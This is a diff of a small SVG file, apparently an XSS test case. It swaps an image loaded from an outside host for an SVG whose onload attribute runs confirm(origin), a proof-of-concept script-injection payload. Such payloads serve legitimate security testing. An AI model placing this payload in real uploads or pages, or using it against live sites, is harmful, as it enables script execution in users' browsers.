@@ -1,3 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg"><image href="http://hitherehehe.top:1337/xss_pic_svg.svg"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="confirm(origin)"/>
 
